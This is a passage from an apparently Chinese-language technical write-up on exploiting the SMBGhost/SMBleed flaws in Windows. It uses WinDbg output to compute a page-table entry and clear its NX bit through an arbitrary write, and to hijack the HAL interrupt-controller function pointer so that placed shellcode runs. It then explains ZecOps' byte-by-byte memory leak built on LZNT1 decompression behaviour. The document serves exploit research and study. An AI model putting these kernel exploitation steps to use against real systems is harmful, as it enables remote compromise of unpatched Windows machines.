    fffff802`045add36 4823c8          and     rcx,rax
    fffff802`045add39 48b80000000080efffff mov rax,0FFFFEF8000000000h
    fffff802`045add43 4803c1          add     rax,rcx
    fffff802`045add46 c3              ret
    fffff802`045add47 cc              int     3
    fffff802`045add48 cc              int     3
在获取了PTE BASE之后可按照以上流程计算某地址的PTE，按照上面的代码计算FFFFF7800000000（KUSER_SHARED_DATA
的起始地址）的PTE为：((FFFFF78000000000 >> 9 ) & 7FFFFFFFF8) + 0xFFFFEF8000000000 =
0xFFFFEFFBC0000000，对比如下输出可知，我们已经成功计算出了FFFFF7800000000对应的PTE。
    0: kd> !pte fffff78000000000
                                               VA fffff78000000000
    PXE at FFFFEFF7FBFDFF78    PPE at FFFFEFF7FBFEF000    PDE at FFFFEFF7FDE00000    PTE at FFFFEFFBC0000000
    contains 0000000001300063  contains 0000000001281063  contains 0000000001782063  contains 00000000013B2963
    pfn 1300      ---DA--KWEV  pfn 1281      ---DA--KWEV  pfn 1782      ---DA--KWEV  pfn 13b2      -G-DA--KWEV
PDF链接：
**去NX标志位：** 知道了目标地址的PTE（
0xFFFFEFFBC0000000），就可以为其去掉NX标志，这样就可以在这个区域执行代码了，思路是利用任意地址写将PTE指向的地址的 NoExecute
标志位修改为0。
    2: kd> db ffffeffb`c0000006
    ffffeffb`c0000006  00 80 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    0: kd> db FFFFEFFBC0000000+6    //修改后
    ffffeffb`c0000006  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    1: kd> dt _MMPTE_HARDWARE FFFFEFFBC0000000
    nt!_MMPTE_HARDWARE
       +0x000 Valid            : 0y1
       +0x000 Dirty1           : 0y1
       +0x000 Owner            : 0y0
       +0x000 WriteThrough     : 0y0
       +0x000 CacheDisable     : 0y0
       +0x000 Accessed         : 0y1
       +0x000 Dirty            : 0y1
       +0x000 LargePage        : 0y0
       +0x000 Global           : 0y1
       +0x000 CopyOnWrite      : 0y0
       +0x000 Unused           : 0y0
       +0x000 Write            : 0y1
       +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
       +0x000 ReservedForHardware : 0y0000
       +0x000 ReservedForSoftware : 0y0000
       +0x000 WsleAge          : 0y0000
       +0x000 WsleProtection   : 0y000
       +0x000 NoExecute        : 0y1
    0: kd> dt _MMPTE_HARDWARE FFFFEFFBC0000000    //修改后
    nt!_MMPTE_HARDWARE
       +0x000 Valid            : 0y1
       +0x000 Dirty1           : 0y1
       +0x000 Owner            : 0y0
       +0x000 WriteThrough     : 0y0
       +0x000 CacheDisable     : 0y0
       +0x000 Accessed         : 0y1
       +0x000 Dirty            : 0y1
       +0x000 LargePage        : 0y0
       +0x000 Global           : 0y1
       +0x000 CopyOnWrite      : 0y0
       +0x000 Unused           : 0y0
       +0x000 Write            : 0y1
       +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
       +0x000 ReservedForHardware : 0y0000
       +0x000 ReservedForSoftware : 0y0000
       +0x000 WsleAge          : 0y0000
       +0x000 WsleProtection   : 0y000
       +0x000 NoExecute        : 0y0
**寻找HAL：**
HAL堆是在HAL.DLL引导过程中创建的，HAL堆上存放了HalpInterruptController（目前也是随机化的），其中保存了一些函数指针，其偏移0x78处存放了hal!HalpApicRequestInterrupt函数指针。这个函数和中断相关，会被系统一直调用，所以可通过覆盖这个指针劫持执行流程。
    0: kd> dq poi(hal!HalpInterruptController)
    fffff7e6`80000698  fffff7e6`800008f0 fffff802`04486e50
    fffff7e6`800006a8  fffff7e6`800007f0 00000000`00000030
    fffff7e6`800006b8  fffff802`04422d80 fffff802`04421b90
    fffff7e6`800006c8  fffff802`04422520 fffff802`044226e0
    fffff7e6`800006d8  fffff802`044226b0 00000000`00000000
    fffff7e6`800006e8  fffff802`044223c0 00000000`00000000
    fffff7e6`800006f8  fffff802`04454560 fffff802`04432770
    fffff7e6`80000708  fffff802`04421890 fffff802`0441abb0
    0: kd> u fffff802`0441abb0
    hal!HalpApicRequestInterrupt:
    fffff802`0441abb0 48896c2420      mov     qword ptr [rsp+20h],rbp
    fffff802`0441abb5 56              push    rsi
    fffff802`0441abb6 4154            push    r12
    fffff802`0441abb8 4156            push    r14
    fffff802`0441abba 4883ec40        sub     rsp,40h
    fffff802`0441abbe 488bb42480000000 mov     rsi,qword ptr [rsp+80h]
    fffff802`0441abc6 33c0            xor     eax,eax
    fffff802`0441abc8 4532e4          xor     r12b,r12b
可通过遍历物理页找到HalpInterruptController地址，如下所示，在虚拟机调试环境下该地址位于第一个物理页。在获得这个地址后，可通过0x78偏移找到alpApicRequestInterrupt函数指针地址，覆盖这个地址为Shellcode地址0xfffff78000000800，等待劫持执行流程。
    1: kd> !dq 1000
    #    1000 00000000`00000000 00000000`00000000
    #    1010 00000000`01010600 00000000`00000000
    #    ......
    #    18f0 fffff7e6`80000b20 fffff7e6`80000698
    #    1900 fffff7e6`80000a48 00000000`00000004
**Shellcode复制 &&执行：**
通过任意地址写将Shellcode复制到0xfffff78000000800，等待“alpApicRequestInterrupt函数”被调用。
    0: kd> g
    Breakpoint 0 hit
    fffff780`00000800 55              push    rbp
    0: kd> k
     # Child-SP          RetAddr               Call Site
    00 fffff800`482b24c8 fffff800`450273a0     0xfffff780`00000800
    01 fffff800`482b24d0 fffff800`4536c4b8     hal!HalSendNMI+0x330
    02 fffff800`482b2670 fffff800`4536bbee     nt!KiSendFreeze+0xb0
    03 fffff800`482b26d0 fffff800`45a136ac     nt!KeFreezeExecution+0x20e
    04 fffff800`482b2800 fffff800`45360811     nt!KdEnterDebugger+0x64
    05 fffff800`482b2830 fffff800`45a17105     nt!KdpReport+0x71
    06 fffff800`482b2870 fffff800`451bbbf0     nt!KdpTrap+0x14d
    07 fffff800`482b28c0 fffff800`451bb85f     nt!KdTrap+0x2c
    08 fffff800`482b2900 fffff800`45280202     nt!KiDispatchException+0x15f
* * *
# SMBGhost&&SMBleed远程代码执行
Zecops利用思路的灵魂是通过判断LZNT1解压是否成功来泄露单个字节，有点爆破的意思在里面。
### LZNT1解压特性
通过逆向可以发现LZNT1压缩数据由压缩块组成，每个压缩块有两个字节的块头部，通过最高位是否设置可判断该块是否被压缩，其与0xFFF相与再加3（2字节的chunk
header+1字节的flag）为这个压缩块的长度。每个压缩块中有若干个小块，每个小块开头都有存放标志的1字节数据。该字节中的每个比特控制后面的相应区域，是直接复制(0)还是重复复制(1)。
这里先举个后面会用到的例子，如下所示。解压时首先取出2个字节的块头部0xB007，0xB007&0xFFF+3=0xa，所以这个块的大小为10，就是以下这10个字节。然后取出标志字节0x14，其二进制为00010100，对应了后面的8项数据，如果相应的比特位为0，就直接将该字节项复制到待解压缓冲区，如果相应比特位为1，表示数据有重复，从相应的偏移取出两个字节数据，根据环境计算出复制的源地址和复制的长度。
由于0x14的前两个比特为0，b0 00 直接复制到目标缓冲区，下一个比特位为1，则取出0x007e，复制0x7e+3（0x81）个 00
到目标缓冲区，然后下一个比特位是0，复制ff到目标缓冲区，下个比特位为1，所以又取出0x007c，复制0x7c+3（0x7f）个 FF
到目标缓冲区，由于此时已走到边界点，对该压缩块的解压结束。以下为解压结果：
    kd> db ffffa508`31ac115e lff+3+1
    ffffa508`31ac115e  b0 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac116e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac117e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac118e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac119e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11ae  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11be  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11ce  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11de  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac11ee  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac11fe  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac120e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac121e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac122e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac123e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac124e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac125e  ff ff ff                                         ...
Zecops在文章中提出可通过向目标发送压缩测试数据并检测该连接是否断开来判断是否解压失败，如果解压失败，则连接断开，而利用LZNT1解压的特性可通过判断解压成功与否来泄露1字节数据。下面来总结解压成功和解压失败的模式。
**00 00 模式：** 文中提示LZNT1压缩数据可以 00 00
结尾（类似于以NULL终止的字符串，可选的）。如下所示，当读取到的长度为0时跳出循环，在比较了指针没有超出边界之后，正常退出函数。
    // RtlDecompressBufferLZNT1
        v11 = *(_WORD *)compressed_data_point; 
        if ( !*(_WORD *)compressed_data_point )
          break;
        ......
      }
      v17 = *(_DWORD **)&a6; 
      if ( compressed_data_point <= compressed_data_boundary )
      {
        **(_DWORD **)&a6 = (_DWORD)decompress_data_p2 - decompress_data_p1;
        goto LABEL_15;
      }